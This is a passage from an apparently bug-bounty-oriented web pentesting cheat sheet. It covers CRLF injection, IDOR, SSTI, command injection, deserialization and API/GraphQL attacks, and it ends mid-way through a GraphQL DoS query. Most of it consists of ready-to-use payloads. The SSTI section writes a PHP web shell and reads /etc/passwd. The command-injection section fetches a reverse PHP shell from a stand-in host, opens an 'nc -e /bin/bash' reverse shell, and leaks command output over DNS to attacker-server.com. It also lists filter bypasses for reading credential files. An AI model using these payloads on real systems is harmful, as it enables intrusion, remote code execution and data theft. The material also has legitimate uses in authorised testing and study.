• The Sec-WebSocket-Key request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
• The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

# Tool
https://github.com/PalindromeLabs/STEWS
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crlf"><a class="header" href="#crlf">CRLF</a></h1>
<h2 id="tools-13"><a class="header" href="#tools-13">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/MichaelStott/CRLF-Injection-Scanner
crlf_scan.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;
# https://github.com/dwisiswant0/crlfuzz
crlfuzz -u "http://target"
# https://github.com/ryandamour/crlfmap
crlfmap scan --domains domains.txt --output results.txt
</code></pre>
<pre><code class="language-text">The following simplified example uses CRLF to:

1. Add a fake HTTP response header: Content-Length: 0. This causes the web browser to treat this as a terminated response and begin parsing a new response.
2. Add a fake HTTP response: HTTP/1.1 200 OK. This begins the new response.
3. Add another fake HTTP response header: Content-Type: text/html. This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header: Content-Length: 25. This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS: &lt;script&gt;alert(1)&lt;/script&gt;. This content has exactly 25 bytes.
6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.

    http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

- Cloudflare CRLF bypass
&lt;iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”&gt;

Payload list:
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
/%0d%0aheader:header
/%0aheader:header
/%0dheader:header
/%23%0dheader:header
/%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="idor"><a class="header" href="#idor">IDOR</a></h1>
<h2 id="basics-1"><a class="header" href="#basics-1">Basics</a></h2>
<pre><code class="language-text">Check for valuable words:
{regex + perm} id
{regex + perm} user
{regex + perm} account
{regex + perm} number
{regex + perm} order
{regex + perm} no
{regex + perm} doc
{regex + perm} key
{regex + perm} email
{regex + perm} group
{regex + perm} profile
{regex + perm} edit
</code></pre>
<h2 id="bypasses-1"><a class="header" href="#bypasses-1">Bypasses</a></h2>
<ul>
<li>Add parameters onto the endpoints for example, if there was</li>
</ul>
<pre><code class="language-text">GET /api_v1/messages --&gt; 401
vs 
GET /api_v1/messages?user_id=victim_uuid --&gt; 200
</code></pre>
<ul>
<li>HTTP Parameter pollution</li>
</ul>
<pre><code class="language-text">GET /api_v1/messages?user_id=VICTIM_ID --&gt; 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&amp;user_id=VICTIM_ID --&gt; 200 OK

GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;user_id=ANOTHER_USERS_ID[]
</code></pre>
<ul>
<li>Add .json to the endpoint, if it is built in Ruby!</li>
</ul>
<pre><code class="language-text">/user_data/2341 --&gt; 401 Unauthorized
/user_data/2341.json --&gt; 200 OK
</code></pre>
<ul>
<li>Test on outdated API Versions</li>
</ul>
<pre><code class="language-text">/v3/users_data/1234 --&gt; 403 Forbidden
/v1/users_data/1234 --&gt; 200 OK
</code></pre>
<p>Wrap the ID with an array.</p>
<pre><code class="language-text">{“id”:111} --&gt; 401 Unauthriozied
{“id”:[111]} --&gt; 200 OK
</code></pre>
<p>Wrap the ID with a JSON object:</p>
<pre><code class="language-text">{“id”:111} --&gt; 401 Unauthriozied

{“id”:{“id”:111}} --&gt; 200 OK
</code></pre>
<p>JSON Parameter Pollution:</p>
<pre><code class="language-text">POST /api/get_profile
Content-Type: application/json
{“user_id”:&lt;legit_id&gt;,”user_id”:&lt;victim’s_id&gt;}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-cache-deception"><a class="header" href="#web-cache-deception">Web Cache Deception</a></h1>
<p>These preconditions can be exploited for the Web Cache Deception attack in the following manner:</p>
<ul>
<li>
<p>Step 1: An attacker entices the victim to open a maliciously crafted link:</p>
<p><code>https://www.example.com/my_profile/test.jpg</code></p>
<p>The application ignores the 'test.jpg' part of the URL, the victim profile page is loaded. The caching mechanism identifies the resource as an image, caching it.</p>
</li>
<li>
<p>Step 2: The attacker sends a GET request for the cached page:</p>
<p><code>https://www.example.com/my_profile/test.jpg</code></p>
<p>The cached resource, which is in fact the victim profile page is returned to the attacker (and to anyone else requesting it).</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="session-fixation"><a class="header" href="#session-fixation">Session fixation</a></h1>
<p><strong>Steps to reproduce</strong></p>
<ol>
<li>Open example.com/login.</li>
<li>Open browser devtools.</li>
<li>Get value for <code>SESSION</code> cookie.</li>
<li>Open example.com/login in the incognito tab.</li>
<li>In the incognito tab, change cookie value to the one, obtained in step 3.</li>
<li>In the normal tab (the one from steps 1-3) log in as any user.</li>
<li>Refresh page in the incognito tab.</li>
</ol>
<p><strong>Result</strong></p>
<p>You are now logged in the incognito tab as user from step 6 as well.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="email-attacks"><a class="header" href="#email-attacks">Email attacks</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Attack</th><th>Payload</th></tr></thead><tbody>
<tr><td>XSS</td><td><p>test+(alert(0))@example.com</p><p>test@example(alert(0)).com</p><p>"alert(0)"@example.com</p><p>&lt;script src=//xsshere?”@email.com</p></td></tr>
<tr><td>Template injection</td><td><p>"&lt;%= 7 * 7 %&gt;"@example.com</p><p> test+(${{7*7}})@example.com</p></td></tr>
<tr><td>SQLi</td><td><p>"' OR 1=1 -- '"@example.com </p><p>"mail'); SELECT version();--"@example.com</p><p>a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1"@a.com</p></td></tr>
<tr><td>SSRF</td><td><p>john.doe@abc123.burpcollaborator.net</p><p>john.doe@[127.0.0.1]</p></td></tr>
<tr><td>Parameter Pollution</td><td>victim&amp;email=attacker@example.com</td></tr>
<tr><td>(Email) Header Injection</td><td><p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p><p>"recipient@test.com&gt;\r\nRCPT TO:&lt;victim+"@test.com</p></td></tr>
<tr><td>Wildcard abuse</td><td>%@example.com</td></tr>
</tbody></table>
</div>
<pre><code># Bypass whitelist
inti(;inti@inti.io;)@whitelisted.com
inti@inti.io(@whitelisted.com)
inti+(@whitelisted.com;)@inti.io

#HTML Injection in Gmail
inti.de.ceukelaire+(&lt;b&gt;bold&lt;u&gt;underline&lt;s&gt;strike&lt;br/&gt;newline&lt;strong&gt;strong&lt;sup&gt;sup&lt;sub&gt;sub)@gmail.com

# Bypass strict validators
# Login with SSO &amp; integrations
GitHub &amp; Salesforce allow xss in email, create account and abuse with login integration

# Common email accounts
support@
jira@
print@
feedback@
asana@
slack@
hello@
bug(s)@
upload@
service@
it@
test@
help@
tickets@
tweet@
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pastejacking"><a class="header" href="#pastejacking">Pastejacking</a></h1>
<pre><code>https://research.securitum.com/the-curious-case-of-copy-paste/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="http-parameter-pollution"><a class="header" href="#http-parameter-pollution">HTTP Parameter pollution</a></h1>
<pre><code># Inject existing extra parameters in GET:
https://www.bank.com/transfer?from=12345&amp;to=67890&amp;amount=5000&amp;from=ABCDEF
https://www.site.com/sharer.php?u=https://site2.com/blog/introducing?&amp;u=https://site3.com/test
</code></pre>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(17).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssti"><a class="header" href="#ssti">SSTI</a></h1>
<pre><code># Tool
# https://github.com/epinna/tplmap
tplmap.py -u 'http://www.target.com/page?name=John'

# Payloads
# https://github.com/payloadbox/ssti-payloads

# Oneliner
# Check SSTI in all param with qsreplace
waybackurls http://target.com | qsreplace "ssti{{9*9}}" &gt; fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
# Check in burp for reponses with ssti81

# Generic
${{&lt;%[%'"}}%\.
{% raw %}
{% debug %}
{7*7}
{{ '7'*7 }}
{{ [] .class.base.subclassesO }}
{{''.class.mro()[l] .subclassesO}}
for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
{{ [].__class__.__base__.__subclasses__O }}

# PHP Based
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}

# Node.js Backend based 
{{ this }}-&gt; [Object Object]
{{ this.__proto__ }}-&gt; [Object Object]
{{ this.__proto__.constructor.name }}-&gt; Object
{{this.constructor.constructor}}
{{this. constructor. constructor('process.pid')()}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Java
${7*7}
&lt;#assign command="freemarker.template.utility.Execute"?new()&gt; ${ command("cat /etc/passwd") }
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Ruby
&lt;%= system("whoami") %&gt;
&lt;%= Dir.entries('/') %&gt;
&lt;%= File.open('/example/arbitrary-file').read %&gt;

# Python
{% debug %}
{{settings.SECRET_KEY}}
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}

# Perl
&lt;%= perl code %&gt;
&lt;% perl code %&gt;

# Flask/Jinja2
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{% endraw %}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# .Net
@(1+2)
@{// C# code}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="prototype-pollution"><a class="header" href="#prototype-pollution">Prototype Pollution</a></h1>
<pre><code class="language-text"># https://github.com/msrkp/PPScan
# https://github.com/BlackFan/client-side-prototype-pollution
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="command-injection"><a class="header" href="#command-injection">Command Injection</a></h1>
<p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.</p>
<pre><code class="language-text"># For detection, try to concatenate another command to param value
&amp;
;
Newline (0x0a or \n)
&amp;&amp;
|
||
# like: https://target.com/whatever?param=1|whoami

# Blind (Time delay)
https://target.com/whatever?param=x||ping+-c+10+127.0.0.1||

# Blind (Redirect)
https://target.com/whatever?param=x||whoami&gt;/var/www/images/output.txt||

# Blind (OOB)
https://target.com/whatever?param=x||nslookup+burp.collaborator.address||
https://target.com/whatever?param=x||nslookup+`whoami`.burp.collaborator.address||

# Common params:
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print

# Useful Commands: Linux
whoami
ifconfig
ls
uname -a

# Useful Commands: Windows
whoami
ipconfig
dir
ver

# Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
ls %0A id

# Time Delay Commands
&amp; ping -c 10 127.0.0.1 &amp;

# Redirecting output
&amp; whoami &gt; /var/www/images/output.txt &amp;

# OOB (Out Of Band) Exploitation
&amp; nslookup attacker-server.com &amp;
&amp; nslookup `whoami`.attacker-server.com &amp;

# WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload

# Some filter bypasses
cat /etc/passwd
cat /e”t”c/pa”s”swd
cat /’e’tc/pa’s’ swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et’ ‘c/passw’ ‘d
cat /et$()c/pa$()$swd
{cat,/etc/passwd}
cat /???/?????d

# Tools
https://github.com/commixproject/commix
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="deserialization"><a class="header" href="#deserialization">Deserialization</a></h1>
<p>Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.</p>
<p>Objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object.</p>
<h2 id="vulnerable-functions"><a class="header" href="#vulnerable-functions">Vulnerable functions</a></h2>
<pre><code># PHP
unserialize()

# Python
pickle/c_pickle/_pickle with load/loads
PyYAML with load
jsonpickle with encode or store methods&gt;/tmp/f

# Java
# Whitebox
XMLdecoder with external user defined parameters
XStream with fromXML method (xstream version &lt;= v1.46 is vulnerable to the serialization issue)
ObjectInputStream with readObject
Uses of readObject, readObjectNodData, readResolve or readExternal
ObjectInputStream.readUnshared
Serializable
# Blackbox
AC ED 00 05 in Hex
rO0 in Base64
Content-type: application/x-java-serialized-object
# ysoserial
java -jar ysoserial.jar CommonsCollections4 'command'

# .Net
# Whithebox
TypeNameHandling
JavaScriptTypeResolver
# Blackbox
AAEAAAD/////
TypeObject
$type
</code></pre>
<h2 id="tools-14"><a class="header" href="#tools-14">Tools</a></h2>
<pre><code># Java
# Ysoserial: https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections4 'command'
# Java Deserialization Scanner: https://github.com/federicodotta/Java-Deserialization-Scanner
# SerialKiller: https://github.com/ikkisoft/SerialKiller
# Serianalyzer: https://github.com/mbechler/serianalyzer
# Java Unmarshaller Security: https://github.com/mbechler/marshalsec
# Java Serial Killer: https://github.com/NetSPI/JavaSerialKiller
# Android Java Deserialization Vulnerability Tester: https://github.com/modzero/modjoda
# Java https://github.com/phith0n/zkar

# .NET
# Ysoserial.net: https://github.com/pwntester/ysoserial.net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c “command-here” -o base64

# Burp-Plugins
# Java: https://github.com/DirectDefense/SuperSerial
# Java: https://github.com/DirectDefense/SuperSerial-Active
# Burp-ysoserial: https://github.com/summitt/burp-ysoserial
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-rebinding"><a class="header" href="#dns-rebinding">DNS rebinding</a></h1>
<h3 id="services"><a class="header" href="#services">Services</a></h3>
<pre><code>https://sslip.io/
https://lock.cmpxchg8b.com/rebinder.html
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-technologies"><a class="header" href="#web-technologies">Web Technologies</a></h1>
<p><strong>Check out in the left submenu what common attack you want review</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="apis"><a class="header" href="#apis">APIs</a></h1>
<h2 id="tools-15"><a class="header" href="#tools-15">Tools</a></h2>
<pre><code class="language-bash"># Tools
https://github.com/Fuzzapi/fuzzapi
https://github.com/Fuzzapi/API-fuzzer
https://github.com/flipkart-incubator/Astra
https://github.com/BBVA/apicheck/
https://github.com/ngalongc/openapi_security_scanner
https://github.com/assetnote/kiterunner
https://github.com/s0md3v/dump/tree/master/json2paths
https://github.com/API-Security/APIKit

# API keys guesser
https://api-guesser.netlify.app/

# Wordlists
https://github.com/chrislockard/api_wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt
https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/api
https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/common-methods/common-methods.txt

# Swagger to burp
https://rhinosecuritylabs.github.io/Swagger-EZ/

# List swagger routes
https://github.com/amalmurali47/swagroutes

# Checklist
https://gitlab.com/pentest-tools/API-Security-Checklist/-/blob/master/README.md

# Best mindmap
https://dsopas.github.io/MindAPI/play/

# GUID guesser
https://gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18
</code></pre>
<h2 id="general-4"><a class="header" href="#general-4">General</a></h2>
<pre><code class="language-bash"># SOAP uses: mostly HTTP and XML, have header and body
# REST uses: HTTP, JSON , URL and XML, defined structure
# GraphQL uses: Custom query language, single endpoint

# Always check for race conditions and memory leaks (%00)

# SQLi tip
{"id":"56456"} - OK
{"id":"56456 AND 1=1#"} -&gt; OK
{"id":"56456 AND 1=2#"} -&gt; OK
{"id":"56456 AND 1=3#"} -&gt; ERROR
{"id":"56456 AND sleep(15)#"} -&gt; SLEEP 15 SEC

# Shell injection
- RoR
Check params like ?url=Kernel#open
and change like ?url=|ls

# Tip
If the request returns nothing:
- Add this header to siumlate a Frontend
"X-requested-with: XMLHttpRequest"
- Add params like:
GET /api/messages             &gt; 401
GET /api/messages?user_id=1   &gt; 200

# Checklist:
•  Auth type
•  Max retries in auth
•  Encryption in sensible fields
•  Test from most vulnerable to less
   ◇ Organization's user management
   ◇ Export to CSV/HTML/PDF
   ◇ Custom views of dashboards
   ◇ Sub user creation&amp;management
   ◇ Object sharing (photos, posts,etc)
• Archive.org
• Censys
• VirusTotal
• Abusing object level authentication
• Abusing weak password/dictionary brute forcing
• Testing for mass management, instead /api/videos/1 -&gt; /api/my_videos
• Testing for excessive data exposure
• Testing for command injection
• Testing for misconfigured permissions
• Testing for SQL injection

Access
• Limit in repeated requests
• Check always HTTPS
• Check HSTS
• Check distinct login paths /api/mobile/login | /api/v3/login | /api/magic_link
• Even id is not numeric, try it /?user_id=111 instead /?user_id=user@mail.com
• Bruteforce login
• Try mobile API versions
• Don't assume developer, mobile and web API is the same, test them separately

Input
• Check distinct methods GET/POST/PUT/DELETE.
• Validate content-type on request Accept header (e.g. application/xml, application/json, etc.)
• Validate content-type of posted data (e.g. application/x-www-form-urlencoded, multipart/form-data, application/json, etc.).
• Validate user input (e.g. XSS, SQL-Injection, Remote Code Execution, etc.).
• Check sensitive data in the URL.
• Try input injections in ALL params
• Locate admin endpoints
• Try execute operating system command 
   ◇ Linux :api.url.com/endpoint?name=file.txt;ls%20/
• XXE
   ◇ &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM “file:///etc/passwd”&gt; ]&gt;
• SSRF
• Check distinct versions api/v{1..3}
• If REST API try to use as SOAP changing the content-type to "application/xml" and sent any simple xml to body
• IDOR in body/header is more vulnerable than ID in URL
• IDOR:
   ◇ Understand real private resources that only belongs specific user
   ◇ Understand relationships receipts-trips
   ◇ Understand roles and groups
   ◇ If REST API, change GET to other method Add a “Content-length” HTTP header or Change the “Content-type”
   ◇ If get 403/401 in api/v1/trips/666 try 50 random IDs from 0001 to 9999
• Bypass IDOR limits:
   ◇ Wrap ID with an array {“id”:111} --&gt; {“id”:[111]}
   ◇ JSON wrap {“id”:111} --&gt; {“id”:{“id”:111}}
   ◇ Send ID twice URL?id=&lt;LEGIT&gt;&amp;id=&lt;VICTIM&gt;
   ◇ Send wildcard {"user_id":"*"}
   ◇ Param pollution 
      ▪ /api/get_profile?user_id=&lt;victim’s_id&gt;&amp;user_id=&lt;user_id&gt;
      ▪ /api/get_profile?user_id=&lt;legit_id&gt;&amp;user_id=&lt;victim’s_id&gt;
      ▪ JSON POST: api/get_profile {“user_id”:&lt;legit_id&gt;,”user_id”:&lt;victim’s_id&gt;}
      ▪ JSON POST: api/get_profile {“user_id”:&lt;victim’s_id&gt;,”user_id”:&lt;legit_id&gt;}
      ▪ Try wildcard instead ID
• If .NET app and found path, Developers sometimes use "Path.Combine(path_1,path_2)" to create full path. Path.Combine has weird behavior: if param#2 is absolute path, then param#1 is ignored.
   ◇ https://example.org/download?filename=a.png -&gt; https://example.org/download?filename=C:\\inetpub\wwwroot\a.png
   ◇ Test: https://example.org/download?filename=\\smb.dns.praetorianlabs.com\a.png
• Found a limit / page param? (e.g: /api/news?limit=100) It might be vulnerable to Layer 7 DoS. Try to send a long value (e.g: limit=999999999) and see what happens :)

Processing
•  Check if all the endpoints are protected behind authentication.
•  Check /user/654321/orders instead /me/orders.
•  Check auto increment ID's.
•  If parsing XML, check XXE.
•  Check if DEBUG is enabled.
• If found GET /api/v1/users/&lt;id&gt; try DELETE / POST to create/delete users
• Test less known endpoint POST /api/profile/upload_christmas_voice_greeting

Output
• If you find sensitive resource like /receipt try /download_receipt,/export_receipt.
• DoS Limit: /api/news?limit=100 -&gt; /api/news?limit=9999999999
• Export pdf - try XSS or HTML injection
   ◇ LFI: username=&lt;iframe src="file:///C:/windows/system32/drivers/etc/hosts" height=1000 width=1000/&gt;
   ◇ SSRF: &lt;object data=”http://127.0.0.1:8443”/&gt;
   ◇ Open Port: &lt;img src=”http://127.0.0.1:445”/&gt; if delay is &lt; 2.3 secs is open
   ◇ Get real IP: &lt;img src=”https://iplogger.com/113A.gif”/&gt;
   ◇ DoS: &lt;img src=”http://download.thinkbroadband.com/1GB.zip”/&gt;
      ▪ &lt;iframe src=”http://example.com/RedirectionLoop.aspx”/&gt;
      
      
# Endpoint bypasses
# whatever.com/api/v1/users/sensitivedata -&gt; access denied
# Add to the final endpoint
.json
?
..;/
\..\.\getUSer
/
??
&amp;details
#
%
%20
%09

# General info about APIs
https://openapi.tools/

# Common vulns
- API Exposure
- Misconfigured Caching
- Exposed tokens
- JWT Weaknesses
- Authorization Issues / IDOR / BOLA
- Undocumented Endpoints
- Different Versions
- Rate Limiting (BF allowed)
- Race Conditions
- XXE injection
- Switching Content Type
- HTTP Methods
- Injection Vulnerabilities
</code></pre>
<h2 id="rest"><a class="header" href="#rest">REST</a></h2>
<pre><code># Predictable endppoints
GET /video/1
DELETE /video/1
GET /video/1/delete
GET /video/2

# Create POST
# Read GET
# Update POST PUT
# Delete PUT DELETE

# Fuzz users &amp; methods to enumerate like /$user$/1 with https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/common-methods/common-methods.txt

# Check if supports SOAP. Change the content-type to "application/xml", add a simple XML in the request body, and see how the API handles it.
</code></pre>
<h2 id="graphql"><a class="header" href="#graphql">GraphQL</a></h2>
<h3 id="tools-16"><a class="header" href="#tools-16">Tools</a></h3>
<pre><code># https://github.com/gsmith257-cyber/GraphCrawler
# https://github.com/dolevf/graphw00f
# https://github.com/nikitastupin/clairvoyance
https://github.com/y0k4i-1337/clairvoyancex
# https://github.com/assetnote/batchql
# https://github.com/dolevf/graphql-cop

# https://github.com/doyensec/GQLSpection
# https://github.com/doyensec/inql
# https://github.com/swisskyrepo/GraphQLmap
# https://apis.guru/graphql-voyager/
# https://gitlab.com/dee-see/graphql-path-enum

# https://graphql.security/
# https://astexplorer.net/

# Burp extensions
https://github.com/doyensec/inql
https://github.com/forcesunseen/graphquail
</code></pre>
<h3 id="resources-1"><a class="header" href="#resources-1">Resources</a></h3>
<pre><code>https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
https://blog.securelayer7.net/api-penetration-testing-with-owasp-2017-test-cases/
https://blog.forcesunseen.com/graphql-security-testing-without-a-schema
https://escape.tech/blog/graphql-security-wordlist/
https://www.assetnote.io/resources/research/exploiting-graphql
</code></pre>
<h3 id="common-bugs"><a class="header" href="#common-bugs">Common bugs</a></h3>
<pre><code># IDOR
Try access any user id other than yours


# SQL/NoSQL Injections
"filters":{
		"username":"test' or 1=1--"
	}
	
# Rate Limit
Because of the nature of GraphQL, we can send multiple queries in a single request by batching them together. If the developers did not implement any kind of mechanism to prevent us from sending batch requests than we could potentially bypass rate limiting by sending the following queries in a single request:
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"x@example.com" password:"password"}){success jwt}}

# Info disclosure
A query can be constructed from scratch from verbose error messages even when we don’t have the benefits of introspection.

# DOS
Similar to XXE billion laughs attack

query {
&amp;amp;amp;nbsp; posts{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp; title
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp; comments{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp; comment
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp; user{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp; comments{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   user{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   comments{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   comment
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;  &amp;amp;amp;nbsp; user{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;  &amp;amp;amp;nbsp; comments{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;  &amp;amp;amp;nbsp; comment
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   user{
